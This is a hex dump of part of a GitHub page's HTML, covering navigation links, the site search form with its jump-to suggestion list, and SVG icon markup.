00048b0 676f 6567 2064 756f 2974 4820 6165 6564
00048c0 2c72 6720 206f 6f74 4e20 6e6f 7270 666f
00048d0 7469 2273 4e3e 6e6f 7270 666f 7469 3c20
00048e0 7073 6e61 6320 616c 7373 223d 7542 706d
00048f0 6c2d 6e69 2d6b 7973 626d 6c6f 6620 6f6c
0004900 7461 722d 6769 7468 7420 7865 2d74 6f6e
0004910 6d72 6c61 7420 7865 2d74 7267 7961 6c2d
0004920 6769 7468 3e22 7226 7261 3b72 2f3c 7073
0004930 6e61 3c3e 612f 3c3e 6c2f 3e69 200a 2020
0004940 2020 2020 2020 2020 2020 2020 2020 2020
0004950 2020 3c20 696c 6320 616c 7373 223d 6465
0004960 6567 692d 6574 2d6d 6966 2278 3c3e 2061
0004970 7268 6665 223d 7468 7074 3a73 2f2f 6465
0004980 6375 7461 6f69 2e6e 6967 6874 6275 632e
0004990 6d6f 2022 6c63 7361 3d73 7022 2d79 2032
00049a0 6270 302d 6c20 2d68 6f63 646e 6e65 6573
00049b0 2d64 6c75 7274 2061 2d64 6c62 636f 206b
00049c0 6f6e 752d 646e 7265 696c 656e 6c20 6e69
00049d0 2d6b 7267 7961 642d 7261 206b 6f6e 752d
00049e0 646e 7265 696c 656e 6820 2035 7542 706d
00049f0 6c2d 6e69 2d6b 682d 766f 7265 2022 6420
0004a00 7461 2d61 6167 632d 696c 6b63 223d 4c28
0004a10 676f 6567 2064 756f 2974 4820 6165 6564
0004a20 2c72 6720 206f 6f74 4520 7564 6163 6974
0004a30 6e6f 3e22 6445 6375 7461 6f69 206e 733c
0004a40 6170 206e 6c63 7361 3d73 4222 6d75 2d70
0004a50 696c 6b6e 732d 6d79 6f62 206c 6c66 616f
0004a60 2d74 6972 6867 2074 6574 7478 6e2d 726f
0004a70 616d 206c 6574 7478 672d 6172 2d79 696c
0004a80 6867 2274 263e 6172 7272 3c3b 732f 6170
0004a90 3e6e 2f3c 3e61 2f3c 696c 0a3e 2020 2020
0004aa0 2020 2020 2020 2020 2020 2020 2020 2020
0004ab0 2f3c 6c75 0a3e 2020 2020 2020 2020 2020
0004ac0 2020 2020 2020 2020 2f3c 6964 3e76 200a
0004ad0 2020 2020 2020 2020 2020 2020 2020 3c20
0004ae0 642f 7465 6961 736c 0a3e 2020 2020 2020
0004af0 2020 2020 2020 2020 2f3c 696c 0a3e 2020
0004b00 2020 2020 2020 2020 2f3c 6c75 0a3e 2020
0004b10 2020 2020 2020 2f3c 616e 3e76 0a0a 2020
0004b20 2020 2020 643c 7669 6320 616c 7373 223d
0004b30 2d64 6c66 7865 6620 656c 2d78 7469 6d65
0004b40 2d73 6563 746e 7265 7020 2d78 2030 6574
0004b50 7478 632d 6e65 6574 2072 6574 7478 6c2d
0004b60 6665 2274 0a3e 2020 2020 2020 2020 2020
0004b70 643c 7669 6320 616c 7373 223d 2d64 676c
0004b80 662d 656c 2078 3e22 200a 2020 2020 2020
0004b90 2020 2020 3c20 6964 2076 6c63 7361 3d73
0004ba0 6822 6165 6564 2d72 6573 7261 6863 6d20
0004bb0 2d72 2033 6373 706f 6465 732d 6165 6372
0004bc0 2068 6973 6574 732d 6f63 6570 2d64 6573
0004bd0 7261 6863 6a20 2d73 6973 6574 732d 6165
0004be0 6372 2068 6f70 6973 6974 6e6f 722d 6c65
0004bf0 7461 7669 2065 736a 6a2d 6d75 2d70 6f74
0004c00 0a22 2020 6f72 656c 223d 6f63 626d 626f
0004c10 786f 0a22 2020 7261 6169 6f2d 6e77 3d73
0004c20 6a22 6d75 2d70 6f74 722d 7365 6c75 7374
0004c30 0a22 2020 7261 6169 6c2d 6261 6c65 223d
0004c40 6553 7261 6863 6f20 2072 756a 706d 7420
0004c50 226f 200a 6120 6972 2d61 6168 7073 706f
0004c60 7075 223d 696c 7473 6f62 2278 200a 6120
0004c70 6972 2d61 7865 6170 646e 6465 223d 6166
0004c80 736c 2265 3e0a 200a 3c20 6964 2076 6c63
0004c90 7361 3d73 7022 736f 7469 6f69 2d6e 6572
0004ca0 616c 6974 6576 3e22 200a 2020 3c20 2d21
0004cb0 202d 2227 2060 2d2d 3c3e 2d21 202d 2f3c
0004cc0 6574 7478 7261 6165 3c3e 782f 706d 203e
0004cd0 2d2d 3c3e 6f2f 7470 6f69 3e6e 2f3c 6f66
0004ce0 6d72 3c3e 6f66 6d72 6320 616c 7373 223d
0004cf0 736a 732d 7469 2d65 6573 7261 6863 662d
0004d00 726f 226d 7220 6c6f 3d65 7322 6165 6372
0004d10 2268 6120 6972 2d61 616c 6562 3d6c 5322
0004d20 7469 2265 6420 7461 2d61 6373 706f 2d65
0004d30 7974 6570 223d 6552 6f70 6973 6f74 7972
0004d40 2022 6164 6174 732d 6f63 6570 692d 3d64
0004d50 3322 3834 3532 3838 2022 6164 6174 732d
0004d60 6f63 6570 2d64 6573 7261 6863 752d 6c72
0004d70 223d 642f 6e61 6569 6d6c 6569 7373 656c
0004d80 2f72 6553 4c63 7369 7374 732f 6165 6372
0004d90 2268 6420 7461 2d61 6e75 6373 706f 6465
0004da0 732d 6165 6372 2d68 7275 3d6c 2f22 6573
0004db0 7261 6863 2022 6361 6974 6e6f 223d 642f
0004dc0 6e61 6569 6d6c 6569 7373 656c 2f72 6553
0004dd0 4c63 7369 7374 732f 6165 6372 2268 6120
0004de0 6363 7065 2d74 6863 7261 6573 3d74 5522
0004df0 4654 382d 2022 656d 6874 646f 223d 6567
0004e00 2274 3c3e 6e69 7570 2074 616e 656d 223d
0004e10 7475 3866 2022 7974 6570 223d 6968 6464
0004e20 6e65 2022 6176 756c 3d65 2622 7823 3732
0004e30 3331 223b 2f20 0a3e 2020 2020 2020 6c3c
0004e40 6261 6c65 6320 616c 7373 223d 6f66 6d72
0004e50 632d 6e6f 7274 6c6f 6920 706e 7475 732d
0004e60 206d 6568 6461 7265 732d 6165 6372 2d68
0004e70 7277 7061 6570 2072 2d70 2030 6568 6461
0004e80 7265 732d 6165 6372 2d68 7277 7061 6570
0004e90 2d72 756a 706d 742d 206f 6f70 6973 6974
0004ea0 6e6f 722d 6c65 7461 7669 2065 2d64 6c66
0004eb0 7865 6620 656c 2d78 756a 7473 6669 2d79
0004ec0 6562 7774 6565 206e 6c66 7865 692d 6574
0004ed0 736d 632d 6e65 6574 2072 736a 632d 7268
0004ee0 6d6f 6c65 7365 2d73 6e69 7570 2d74 6f63
0004ef0 746e 6961 656e 2272 0a3e 2020 2020 2020
0004f00 2020 693c 706e 7475 7420 7079 3d65 7422
0004f10 7865 2274 200a 2020 2020 2020 2020 6320
0004f20 616c 7373 223d 6f66 6d72 632d 6e6f 7274
0004f30 6c6f 6920 706e 7475 732d 206d 6568 6461
0004f40 7265 732d 6165 6372 2d68 6e69 7570 2074
0004f50 756a 706d 742d 2d6f 6966 6c65 2064 736a
0004f60 6a2d 6d75 2d70 6f74 662d 6569 646c 6a20
0004f70 2d73 6973 6574 732d 6165 6372 2d68 6f66
0004f80 7563 2073 736a 732d 7469 2d65 6573 7261
0004f90 6863 662d 6569 646c 6920 2d73 6c63 6165
0004fa0 6172 6c62 2265 200a 2020 2020 2020 2020
0004fb0 6420 7461 2d61 6f68 6b74 7965 223d 2c73
0004fc0 222f 200a 2020 2020 2020 2020 6e20 6d61
0004fd0 3d65 7122 0a22 2020 2020 2020 2020 2020
0004fe0 6176 756c 3d65 2222 200a 2020 2020 2020
0004ff0 2020 7020 616c 6563 6f68 646c 7265 223d
0005000 6553 7261 6863 0a22 2020 2020 2020 2020
0005010 2020 6164 6174 752d 736e 6f63 6570 2d64
0005020 6c70 6361 6865 6c6f 6564 3d72 5322 6165
0005030 6372 2068 6947 4874 6275 0a22 2020 2020
0005040 2020 2020 2020 6164 6174 732d 6f63 6570
0005050 2d64 6c70 6361 6865 6c6f 6564 3d72 5322
0005060 6165 6372 2268 200a 2020 2020 2020 2020
0005070 6120 7475 636f 7061 7469 6c61 7a69 3d65
0005080 6f22 6666 0a22 2020 2020 2020 2020 2020
0005090 7261 6169 612d 7475 636f 6d6f 6c70 7465
00050a0 3d65 6c22 7369 2274 200a 2020 2020 2020
00050b0 2020 6120 6972 2d61 6f63 746e 6f72 736c
00050c0 223d 756a 706d 742d 2d6f 6572 7573 746c
00050d0 2273 200a 2020 2020 2020 2020 6120 6972
00050e0 2d61 616c 6562 3d6c 5322 6165 6372 2268
00050f0 200a 2020 2020 2020 2020 6420 7461 2d61
0005100 756a 706d 742d 2d6f 7573 6767 7365 6974
0005110 6e6f 2d73 6170 6874 223d 5f2f 7267 7061
0005120 7168 2f6c 6547 5374 6775 6567 7473 6465
0005130 614e 6976 6167 6974 6e6f 6544 7473 6e69
0005140 7461 6f69 736e 6323 7273 2d66 6f74 656b
0005150 3d6e 2b42 424f 7976 3475 3834 346b 654c
0005160 7535 524f 4837 4331 766b 7262 4430 736d
0005170 3062 5344 747a 3446 5959 7771 642f 5a62
0005180 6e61 6a2f 4650 4d6e 3967 5763 4c4b 6771
0005190 4e48 5341 7a4d 6432 3439 652f 4e58 7164
00051a0 365a 5179 7276 6737 3d3d 0a22 2020 2020
00051b0 2020 2020 2020 7073 6c65 636c 6568 6b63
00051c0 223d 6166 736c 2265 200a 2020 2020 2020
00051d0 2020 6120 7475 636f 6d6f 6c70 7465 3d65
00051e0 6f22 6666 0a22 2020 2020 2020 2020 2020
00051f0 0a3e 2020 2020 2020 2020 2020 693c 706e
0005200 7475 7420 7079 3d65 6822 6469 6564 226e
0005210 6320 616c 7373 223d 736a 732d 7469 2d65
0005220 6573 7261 6863 742d 7079 2d65 6966 6c65
0005230 2264 6e20 6d61 3d65 7422 7079 2265 3e20
0005240 200a 2020 2020 2020 2020 2020 3c20 6d69
0005250 2067 7273 3d63 6822 7474 7370 2f3a 672f
0005260 7469 7568 2e62 6967 6874 6275 7361 6573
0005270 7374 632e 6d6f 692f 616d 6567 2f73 6573
0005280 7261 6863 6b2d 7965 732d 616c 6873 732e
0005290 6776 2022 6c61 3d74 2222 6320 616c 7373
00052a0 223d 726d 322d 6820 6165 6564 2d72 6573
00052b0 7261 6863 6b2d 7965 732d 616c 6873 3e22
00052c0 0a0a 2020 2020 2020 2020 2020 2020 643c
00052d0 7669 6320 616c 7373 223d 6f42 2078 6f70
00052e0 6973 6974 6e6f 612d 7362 6c6f 7475 2065
00052f0 766f 7265 6c66 776f 682d 6469 6564 206e
0005300 2d64 6f6e 656e 6a20 6d75 2d70 6f74 732d
0005310 6775 6567 7473 6f69 736e 6a20 2d73 756a
0005320 706d 742d 2d6f 7573 6767 7365 6974 6e6f
0005330 2d73 6f63 746e 6961 656e 2272 0a3e 2020
0005340 2020 2020 2020 2020 2020 2020 3c0a 6c75
0005350 6320 616c 7373 223d 2d64 6f6e 656e 6a20
0005360 2d73 756a 706d 742d 2d6f 7573 6767 7365
0005370 6974 6e6f 2d73 6574 706d 616c 6574 632d
0005380 6e6f 6174 6e69 7265 3e22 200a 0a20 3c0a
0005390 696c 6320 616c 7373 223d 2d64 6c66 7865
00053a0 6620 656c 2d78 756a 7473 6669 2d79 7473
00053b0 7261 2074 6c66 7865 692d 6574 736d 632d
00053c0 6e65 6574 2072 2d70 2030 3566 6e20 7661
00053d0 6769 7461 6f69 2d6e 7469 6d65 6a20 2d73
00053e0 616e 6976 6167 6974 6e6f 692d 6574 206d
00053f0 736a 6a2d 6d75 2d70 6f74 732d 6775 6567
0005400 7473 6f69 226e 7220 6c6f 3d65 6f22 7470
0005410 6f69 226e 0a3e 2020 613c 7420 6261 6e69
0005420 6564 3d78 2d22 2231 6320 616c 7373 223d
0005430 6f6e 752d 646e 7265 696c 656e 6420 662d
0005440 656c 2078 6c66 7865 612d 7475 206f 6c66
0005450 7865 692d 6574 736d 632d 6e65 6574 2072
0005460 756a 706d 742d 2d6f 7573 6767 7365 6974
0005470 6e6f 2d73 6170 6874 6a20 2d73 756a 706d
0005480 742d 2d6f 7573 6767 7365 6974 6e6f 702d
0005490 7461 2068 736a 6e2d 7661 6769 7461 6f69
00054a0 2d6e 706f 6e65 7020 322d 2022 7268 6665
00054b0 223d 3e22 200a 2020 3c20 6964 2076 6c63
00054c0 7361 3d73 6a22 6d75 2d70 6f74 6f2d 7463
00054d0 6369 6e6f 6a20 2d73 756a 706d 742d 2d6f
00054e0 636f 6974 6f63 206e 6c66 7865 732d 7268
00054f0 6e69 2d6b 2030 726d 322d 7420 7865 2d74
0005500 6563 746e 7265 6420 6e2d 6e6f 2265 0a3e
0005510 2020 2020 2020 733c 6776 6820 6965 6867
0005520 3d74 3122 2236 7720 6469 6874 223d 3631
0005530 2022 6c63 7361 3d73 6f22 7463 6369 6e6f
0005540 6f20 7463 6369 6e6f 722d 7065 206f 6c66
0005550 7865 732d 7268 6e69 2d6b 2030 736a 6a2d
0005560 6d75 2d70 6f74 6f2d 7463 6369 6e6f 722d
0005570 7065 206f 2d64 6f6e 656e 2022 6974 6c74
0005580 3d65 5222 7065 736f 7469 726f 2279 6120
0005590 6972 2d61 616c 6562 3d6c 5222 7065 736f
00055a0 7469 726f 2279 7620 6569 4277 786f 223d
00055b0 2030 2030 3231 3120 2236 7620 7265 6973
00055c0 6e6f 223d 2e31 2231 7220 6c6f 3d65 6922
00055d0 676d 3e22 703c 7461 2068 6966 6c6c 722d
00055e0 6c75 3d65 6522 6576 6f6e 6464 2022 3d64
00055f0 4d22 2034 4839 5633 6838 7631 7a31 306d
0005600 332d 3348 3176 3168 3656 6d7a 2d30 4832
0005610 7633 6831 5631 7a34 306d 322d 3348 3176
0005620 3168 3256 6d7a 2d38 7631 3231 3063 2e20
0005630 3535 2e2d 3534 3120 312d 3120 3648 3276
0005640 2d6c 2e31 2d35 2e31 4c35 2033 3631 2d76
0005650 4832 6331 2e2d 3535 3020 312d 2e2d 3534
0005660 312d 312d 3156 3063 2e2d 3535 342e 2d35
0005670 2031 2d31 6831 3031 2e63 3535 3020 3120
0005680 2e20 3534 3120 3120 6d7a 312d 3120 4830
0005690 7631 6832 7632 312d 3368 3176 3568 2d76
00056a0 7a32 306d 312d 4830 7632 6839 5639 7a31
00056b0 2f22 3c3e 732f 6776 0a3e 2020 2020 2020
00056c0 733c 6776 6820 6965 6867 3d74 3122 2236
00056d0 7720 6469 6874 223d 3631 2022 6c63 7361
00056e0 3d73 6f22 7463 6369 6e6f 6f20 7463 6369
00056f0 6e6f 702d 6f72 656a 7463 6620 656c 2d78
0005700 6873 6972 6b6e 302d 6a20 2d73 756a 706d
0005710 742d 2d6f 636f 6974 6f63 2d6e 7270 6a6f
0005720 6365 2074 2d64 6f6e 656e 2022 6974 6c74
0005730 3d65 5022 6f72 656a 7463 2022 7261 6169
0005740 6c2d 6261 6c65 223d 7250 6a6f 6365 2274
0005750 7620 6569 4277 786f 223d 2030 2030 3531
0005760 3120 2236 7620 7265 6973 6e6f 223d 2e31
0005770 2231 7220 6c6f 3d65 6922 676d 3e22 703c
0005780 7461 2068 6966 6c6c 722d 6c75 3d65 6522
0005790 6576 6f6e 6464 2022 3d64 4d22 3031 3120
00057a0 6832 5633 6832 332d 3176 7a30 2d6d 2d34
00057b0 6832 5633 4832 7636 7a38 2d6d 2034 6834
00057c0 5633 4832 7632 3231 6d7a 312d 3120 3168
00057d0 5633 4831 7631 3431 4d7a 3431 3020 3148
00057e0 3161 3120 3020 3020 3020 312d 3120 3176
00057f0 6134 2031 2031 2030 2030 2030 2031 6831
0005800 3331 3161 3120 3020 3020 3020 3120 312d
0005810 3156 3161 3120 3020 3020 3020 312d 312d
0005820 227a 3e2f 2f3c 7673 3e67 200a 2020 2020
0005830 3c20 7673 2067 6568 6769 7468 223d 3631
0005840 2022 6977 7464 3d68 3122 2236 6320 616c
0005850 7373 223d 636f 6974 6f63 206e 636f 6974
0005860 6f63 2d6e 6573 7261 6863 6620 656c 2d78
0005870 6873 6972 6b6e 302d 6a20 2d73 756a 706d
0005880 742d 2d6f 636f 6974 6f63 2d6e 6573 7261
0005890 6863 6420 6e2d 6e6f 2265 7420 7469 656c
00058a0 223d 6553 7261 6863 2022 7261 6169 6c2d
00058b0 6261 6c65 223d 6553 7261 6863 2022 6976
00058c0 7765 6f42 3d78 3022 3020 3120 2036 3631
00058d0 2022 6576 7372 6f69 3d6e 3122 312e 2022
00058e0 6f72 656c 223d 6d69 2267 3c3e 6170 6874
00058f0 6620 6c69 2d6c 7572 656c 223d 7665 6e65
0005900 646f 2264 6420 223d 314d 2e35 2037 3331
0005910 332e 2d6c 2e33 3138 332d 382e 4133 2e35
0005920 3339 3520 392e 2033 2030 2030 2030 3331
0005930 3620 3063 332d 332e 2d31 2e32 3936 362d
0005940 362d 362d 3153 3220 362e 2039 2031 7336
0005950 2e32 3936 3620 3620 3620 3163 332e 3020
0005960 3220 342e 2d38 342e 2031 2e33 3734 312d
0005970 312e 6c31 2e33 3338 3320 382e 6331 312e
0005980 2e39 2e32 3534 332e 372e 332e 322e 2035
0005990 2030 352e 2d32 302e 2e39 2d37 332e 2e61
00059a0 3939 2e36 3939 2036 2030 2030 2030 2d30
00059b0 2e31 3134 2e76 3130 4d7a 2037 3031 372e
00059c0 2d63 2e32 3935 3020 342d 372e 322d 312e
00059d0 2d31 2e34 2d37 2e34 2037 2d30 2e32 3935
00059e0 3220 312e 2d31 2e34 2037 2e34 2d37 2e34
00059f0 2037 2e32 3935 3020 3420 372e 3220 312e
0005a00 2031 2e34 2037 2e34 2037 2030 2e32 3935
0005a10 322d 312e 2031 2e34 2d37 2e34 2037 2e34
0005a20 7a37 2f22 3c3e 732f 6776 0a3e 2020 2020
0005a30 2f3c 6964 3e76 0a0a 2020 2020 693c 676d
0005a40 6320 616c 7373 223d 7661 7461 7261 6d20
0005a50 2d72 2032 6c66 7865 732d 7268 6e69 2d6b
0005a60 2030 736a 6a2d 6d75 2d70 6f74 732d 6775
0005a70 6567 7473 6f69 2d6e 7661 7461 7261 6420
0005a80 6e2d 6e6f 2265 6120 746c 223d 2022 7261
0005a90 6169 6c2d 6261 6c65 223d 6554 6d61 2022
0005aa0 7273 3d63 2222 7720 6469 6874 223d 3832
0005ab0 2022 6568 6769 7468 223d 3832 3e22 0a0a
0005ac0 2020 2020 643c 7669 6320 616c 7373 223d
0005ad0 756a 706d 742d 2d6f 7573 6767 7365 6974
0005ae0 6e6f 6e2d 6d61 2065 736a 6a2d 6d75 2d70
0005af0 6f74 732d 6775 6567 7473 6f69 2d6e 616e
0005b00 656d 6620 656c 2d78 7561 6f74 6f20 6576
0005b10 6672 6f6c 2d77 6968 6464 6e65 7420 7865
0005b20 2d74 656c 7466 6e20 2d6f 7277 7061 6320
0005b30 7373 742d 7572 636e 7461 2065 7363 2d73
0005b40 7274 6e75 6163 6574 742d 7261 6567 2274
0005b50 0a3e 2020 2020 2f3c 6964 3e76 0a0a 2020
0005b60 2020 643c 7669 6320 616c 7373 223d 6f62
0005b70 6472 7265 7220 756f 646e 6465 312d 6620
0005b80 656c 2d78 6873 6972 6b6e 302d 6220 2d67
0005b90 7267 7961 7020 2d78 2031 6574 7478 672d
0005ba0 6172 2d79 696c 6867 2074 6c6d 312d 6620
0005bb0 2036 2d64 6f6e 656e 6a20 2d73 756a 706d
0005bc0 742d 2d6f 6162 6764 2d65 6573 7261 6863
0005bd0 3e22 200a 2020 2020 3c20 7073 6e61 6320
0005be0 616c 7373 223d 736a 6a2d 6d75 2d70 6f74
0005bf0 622d 6461 6567 732d 6165 6372 2d68 6574
0005c00 7478 642d 6665 7561 746c 6420 6e2d 6e6f
0005c10 2265 6120 6972 2d61 616c 6562 3d6c 6922
0005c20 206e 6874 7369 7220 7065 736f 7469 726f
0005c30 2279 0a3e 2020 2020 2020 2020 6e49 7420
0005c40 6968 2073 6572 6f70 6973 6f74 7972 200a
0005c50 2020 2020 3c20 732f 6170 3e6e 200a 2020
0005c60 2020 3c20 7073 6e61 6320 616c 7373 223d
0005c70 736a 6a2d 6d75 2d70 6f74 622d 6461 6567
0005c80 732d 6165 6372 2d68 6574 7478 672d 6f6c
0005c90 6162 206c 2d64 6f6e 656e 2022 7261 6169
0005ca0 6c2d 6261 6c65 223d 6e69 6120 6c6c 6f20
0005cb0 2066 6947 4874 6275 3e22 200a 2020 2020
0005cc0 2020 4120 6c6c 4720 7469 7548 0a62 2020
0005cd0 2020 2020 2f3c 7073 6e61 0a3e 2020 2020
0005ce0 2020 733c 6170 206e 7261 6169 682d 6469
0005cf0 6564 3d6e 7422 7572 2265 6320 616c 7373
0005d00 223d 2d64 6e69 696c 656e 622d 6f6c 6b63
0005d10 6d20 2d6c 2031 2d76 6c61 6769 2d6e 696d
0005d20 6464 656c 3e22 86e2 3cb5 732f 6170 3e6e
0005d30 200a 2020 3c20 642f 7669 0a3e 200a 2020
0005d40 3c20 6964 2076 7261 6169 682d 6469 6564
0005d50 3d6e 7422 7572 2265 6320 616c 7373 223d
0005d60 6f62 6472 7265 7220 756f 646e 6465 312d
0005d70 6620 656c 2d78 6873 6972 6b6e 302d 6220
0005d80 2d67 7267 7961 7020 2d78 2031 6574 7478
0005d90 672d 6172 2d79 696c 6867 2074 6c6d 312d
0005da0 6620 2036 2d64 6f6e 656e 6420 6f2d 2d6e
0005db0 616e 2d76 6f66 7563 2073 736a 6a2d 6d75
0005dc0 2d70 6f74 622d 6461 6567 6a2d 6d75 2270
0005dd0 0a3e 2020 2020 2020 754a 706d 7420 0a6f
0005de0 2020 2020 2020 733c 6170 206e 6c63 7361
0005df0 3d73 6422 692d 6c6e 6e69 2d65 6c62 636f
0005e00 206b 6c6d 312d 7620 612d 696c 6e67 6d2d
0005e10 6469 6c64 2265 e23e b586 2f3c 7073 6e61
0005e20 0a3e 2020 2020 2f3c 6964 3e76 200a 3c20
0005e30 612f 0a3e 2f3c 696c 0a3e 3c0a 752f 3e6c
0005e40 0a0a 753c 206c 6c63 7361 3d73 6422 6e2d
0005e50 6e6f 2065 736a 6a2d 6d75 2d70 6f74 6e2d
0005e60 2d6f 6572 7573 746c 2d73 6574 706d 616c
0005e70 6574 632d 6e6f 6174 6e69 7265 3e22 200a
0005e80 3c20 696c 6320 616c 7373 223d 2d64 6c66
0005e90 7865 6620 656c 2d78 756a 7473 6669 2d79
0005ea0 6563 746e 7265 6620 656c 2d78 7469 6d65
0005eb0 2d73 6563 746e 7265 6620 2035 2d64 6f6e
0005ec0 656e 6a20 2d73 756a 706d 742d 2d6f 7573
0005ed0 6767 7365 6974 6e6f 7020 322d 3e22 200a
0005ee0 2020 3c20 7073 6e61 6320 616c 7373 223d
0005ef0 6574 7478 672d 6172 2279 4e3e 206f 7573
0005f00 6767 7365 6574 2064 756a 706d 7420 206f
0005f10 6572 7573 746c 3c73 732f 6170 3e6e 200a
0005f20 3c20 6c2f 3e69 3c0a 752f 3e6c 0a0a 753c
0005f30 206c 6469 223d 756a 706d 742d 2d6f 6572
0005f40 7573 746c 2273 7220 6c6f 3d65 6c22 7369
0005f50 6274 786f 2022 6c63 7361 3d73 7022 302d
0005f60 6d20 302d 6a20 2d73 616e 6976 6167 6974
0005f70 6e6f 632d 6e6f 6174 6e69 7265 6a20 6d75
0005f80 2d70 6f74 732d 6775 6567 7473 6f69 736e
0005f90 722d 7365 6c75 7374 632d 6e6f 6174 6e69
0005fa0 7265 6a20 2d73 756a 706d 742d 2d6f 7573
0005fb0 6767 7365 6974 6e6f 2d73 6572 7573 746c
0005fc0 2d73 6f63 746e 6961 656e 2272 0a3e 2020
0005fd0 0a0a 6c3c 2069 6c63 7361 3d73 6422 662d
0005fe0 656c 2078 6c66 7865 6a2d 7375 6974 7966
0005ff0 732d 6174 7472 6620 656c 2d78 7469 6d65
0006000 2d73 6563 746e 7265 7020 302d 6620 2035
0006010 616e 6976 6167 6974 6e6f 692d 6574 206d
0006020 736a 6e2d 7661 6769 7461 6f69 2d6e 7469
0006030 6d65 6a20 2d73 756a 706d 742d 2d6f 6373
0006040 706f 6465 732d 6165 6372 2068 2d64 6f6e
0006050 656e 2022 6f72 656c 223d 706f 6974 6e6f
0006060 3e22 200a 3c20 2061 6174 6962 646e 7865
0006070 223d 312d 2022 6c63 7361 3d73 6e22 2d6f
0006080 6e75 6564 6c72 6e69 2065 2d64 6c66 7865
0006090 6620 656c 2d78 7561 6f74 6620 656c 2d78
00060a0 7469 6d65 2d73 6563 746e 7265 6a20 6d75
00060b0 2d70 6f74 732d 6775 6567 7473 6f69 736e
00060c0 702d 7461 2068 736a 6a2d 6d75 2d70 6f74
00060d0 732d 6775 6567 7473 6f69 2d6e 6170 6874
00060e0 6a20 2d73 616e 6976 6167 6974 6e6f 6f2d
00060f0 6570 206e 2d70 2232 6820 6572 3d66 2222
0006100 0a3e 2020 2020 643c 7669 6320 616c 7373
0006110 223d 756a 706d 742d 2d6f 636f 6974 6f63
0006120 206e 736a 6a2d 6d75 2d70 6f74 6f2d 7463
0006130 6369 6e6f 6620 656c 2d78 6873 6972 6b6e
0006140 302d 6d20 2d72 2032 6574 7478 632d 6e65
0006150 6574 2072 2d64 6f6e 656e 3e22 200a 2020
0006160 2020 3c20 7673 2067 6568 6769 7468 223d
0006170 3631 2022 6977 7464 3d68 3122 2236 6320
0006180 616c 7373 223d 636f 6974 6f63 206e 636f
0006190 6974 6f63 2d6e 6572 6f70 6620 656c 2d78
00061a0 6873 6972 6b6e 302d 6a20 2d73 756a 706d
00061b0 742d 2d6f 636f 6974 6f63 2d6e 6572 6f70
00061c0 6420 6e2d 6e6f 2265 7420 7469 656c 223d
00061d0 6552 6f70 6973 6f74 7972 2022 7261 6169
00061e0 6c2d 6261 6c65 223d 6552 6f70 6973 6f74
00061f0 7972 2022 6976 7765 6f42 3d78 3022 3020
0006200 3120 2032 3631 2022 6576 7372 6f69 3d6e
0006210 3122 312e 2022 6f72 656c 223d 6d69 2267
0006220 3c3e 6170 6874 6620 6c69 2d6c 7572 656c
0006230 223d 7665 6e65 646f 2264 6420 223d 344d
0006240 3920 3348 3856 3168 3176 6d7a 2d30 4833
0006250 7633 6831 5631 7a36 306d 322d 3348 3176
0006260 3168 3456 6d7a 2d30 4832 7633 6831 5631
0006270 7a32 386d 312d 3176 6332 2030 352e 2d35
0006280 342e 2035 2d31 2031 4831 7636 6c32 312d
0006290 352e 312d 352e 334c 3120 7636 322d 3148
00062a0 2d63 352e 2035 2d30 2d31 342e 2d35 2d31
00062b0 5631 6331 2d30 352e 2e35 3534 312d 3120
00062c0 312d 3168 6330 352e 2035 2030 2031 342e
00062d0 2035 2031 7a31 2d6d 2031 3031 3148 3276
00062e0 3268 2d76 6831 7633 6831 7635 322d 6d7a
00062f0 2d30 3031 3248 3976 3968 3156 227a 3e2f
0006300 2f3c 7673 3e67 200a 2020 2020 3c20 7673
0006310 2067 6568 6769 7468 223d 3631 2022 6977
0006320 7464 3d68 3122 2236 6320 616c 7373 223d
0006330 636f 6974 6f63 206e 636f 6974 6f63 2d6e
0006340 7270 6a6f 6365 2074 6c66 7865 732d 7268
0006350 6e69 2d6b 2030 736a 6a2d 6d75 2d70 6f74
0006360 6f2d 7463 6369 6e6f 702d 6f72 656a 7463
0006370 6420 6e2d 6e6f 2265 7420 7469 656c 223d
0006380 7250 6a6f 6365 2274 6120 6972 2d61 616c
0006390 6562 3d6c 5022 6f72 656a 7463 2022 6976
00063a0 7765 6f42 3d78 3022 3020 3120 2035 3631
00063b0 2022 6576 7372 6f69 3d6e 3122 312e 2022
00063c0 6f72 656c 223d 6d69 2267 3c3e 6170 6874
00063d0 6620 6c69 2d6c 7572 656c 223d 7665 6e65
00063e0 646f 2264 6420 223d 314d 2030 3231 3368
00063f0 3256 2d68 7633 3031 6d7a 342d 322d 3368
0006400 3256 3648 3876 6d7a 342d 3420 3368 3256
0006410 3248 3176 7a32 2d6d 2031 6831 3331 3156
0006420 3148 3176 7a34 314d 2034 4830 6131 2031
0006430 2031 2030 2030 2d30 2031 7631 3431 3161
0006440 3120 3020 3020 3020 3120 3120 3168 6133
0006450 2031 2031 2030 2030 2030 2d31 5631 6131
0006460 2031 2031 2030 2030 2d30 2d31 7a31 2f22
0006470 3c3e 732f 6776 0a3e 2020 2020 2020 733c
0006480 6776 6820 6965 6867 3d74 3122 2236 7720
0006490 6469 6874 223d 3631 2022 6c63 7361 3d73
00064a0 6f22 7463 6369 6e6f 6f20 7463 6369 6e6f
00064b0 732d 6165 6372 2068 6c66 7865 732d 7268
00064c0 6e69 2d6b 2030 736a 6a2d 6d75 2d70 6f74
00064d0 6f2d 7463 6369 6e6f 732d 6165 6372 2068
00064e0 2d64 6f6e 656e 2022 6974 6c74 3d65 5322
00064f0 6165 6372 2268 6120 6972 2d61 616c 6562
0006500 3d6c 5322 6165 6372 2268 7620 6569 4277
0006510 786f 223d 2030 2030 3631 3120 2236 7620
0006520 7265 6973 6e6f 223d 2e31 2231 7220 6c6f
0006530 3d65 6922 676d 3e22 703c 7461 2068 6966
0006540 6c6c 722d 6c75 3d65 6522 6576 6f6e 6464
0006550 2022 3d64 4d22 3531 372e 3120 2e33 6c33
0006560 332d 382e 2d31 2e33 3338 3541 392e 2033
0006570 2e35 3339 3020 3020 3020 3120 2033 6336
0006580 2d30 2e33 3133 322d 362e 2d39 2d36 2d36
0006590 5336 2031 2e32 3936 3120 3620 3273 362e
00065a0 2039 2036 2036 6336 2e31 2033 2030 2e32
00065b0 3834 2e2d 3134 3320 342e 2d37 2e31 3131
00065c0 336c 382e 2033 2e33 3138 2e63 3931 322e
00065d0 342e 2e35 2e33 2e37 2e33 3532 3020 2e20
00065e0 3235 2e2d 3930 372e 2e2d 6133 392e 3639
00065f0 392e 3639 3020 3020 3020 3020 312d 342e
0006600 7631 302e 7a31 374d 3120 2e30 6337 322d
0006610 352e 2039 2d30 2e34 2d37 2e32 3131 342d
0006620 372e 342d 372e 3020 322d 352e 2039 2e32
